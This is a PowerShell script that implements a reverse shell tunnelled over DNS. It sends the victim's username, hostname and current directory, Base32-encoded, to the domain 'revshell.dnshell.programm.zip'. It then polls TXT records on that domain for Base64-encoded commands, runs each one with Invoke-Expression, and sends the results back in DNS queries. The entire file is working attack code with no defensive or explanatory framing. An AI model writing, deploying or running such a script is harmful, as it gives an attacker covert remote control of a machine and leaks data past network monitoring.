$base32Characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
$paddingChar = '='

function ConvertTo-Base32 {
    param (
        [Parameter(Mandatory = $true, Position = 0)]
        [String]$inputString
    )

    $output = ''
    $byteCount = 0
    $buffer = 0

    foreach ($char in $inputString.ToCharArray()) {
        $buffer = ($buffer * 256 + [byte]$char)
        $byteCount += 8

        while ($byteCount -ge 5) {
            $byteCount -= 5
            $index = [math]::Floor($buffer / [math]::Pow(2, $byteCount))
            $output += $base32Characters[$index]
            $buffer = $buffer % [math]::Pow(2, $byteCount)
        }
    }

    if ($byteCount -gt 0) {
        $buffer *= [math]::Pow(2, 5 - $byteCount)
        $output += $base32Characters[$buffer]
    }

    # Add padding if needed
    $paddingLength = (8 - ($output.Length % 8)) % 8
    $output += $paddingChar * $paddingLength

    $output
}

function Send-Data {
    param (
        $data,
        $code,
        $counter
    )

    $metadata = @{
        pwd = $PWD.Path
        user = $Env:UserName
        hostname = hostname
    }

    # Add all of the elements in metadata to data
    $data = $data + $metadata

    $json = $data | ConvertTo-Json
    
    # Encode data as Base32
    $encodedData = ConvertTo-Base32 ($json)

    # Replace padding characters with _ so it can be transmitted over DNS
    $encodedData = $encodedData.Replace("=", "_")
    
    $chunk_size = 63 # Max size of a DNS label (between two dots)
    $chunks = [Math]::Ceiling($encodedData.Length / $chunk_size) # Calculate the number of chunks
        
    for ($i = 0; $i -lt $chunks; $i++) {
        Write-Host "Sending Chunk $($i+1) of $chunks"
        $currentChunk = $encodedData.Substring($i * $chunk_size, [Math]::Min($chunk_size, $encodedData.Length - $i * $chunk_size))
        $query = "$i.$chunks.$code-$counter.$domain"
        $dnsQuery = "$currentChunk.$query"

        # Send DNS query
        $dnsResult = Resolve-DnsName -Name $dnsQuery -ErrorAction Ignore -Type A

        if ($dnsResult) {
            # Never has a response ready, hopefully :-)
        }
    }
}

$domain = "revshell.dnshell.programm.zip"
$code = (Get-Date).ToString("yyyyMMddHHmmss")

# Send code to DNS server
Send-Data -data @{
    code = $code
} -code 0 -counter 0

# Request TXT record from DNS server
$commandcount = 0
$stop = $false
while (!$stop) {
    Write-Host "Request to: $commandcount.$code.$domain"
    $dnsResult = Resolve-DnsName -Name "$commandcount.$code.$domain" -Type TXT -ErrorAction Ignore
    if ($dnsResult) {
        try{
            $command = $dnsResult.Strings
            Write-Host "Command: $command"
            $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($command))
            $output = $command | Invoke-Expression -ErrorAction Stop
            $output = ($output | Format-Table | Out-String)
            Write-Host "Send Output with length $($output.Length)"
            if($output.Length -eq 0){
                $output = ""
            }
            # Send current PWD
            Write-Host "Sending Output"
            Send-Data -data @{
                output = $output
            } -code $code -counter $commandcount
        }
        catch {
            Write-Host "Sending Error $_"
            Send-Data -data @{
                output = "Error: $_"
            } -code $code -counter $commandcount
        }
        $commandcount++
    }
    else {
        
    }
    Start-Sleep -Seconds 1
}
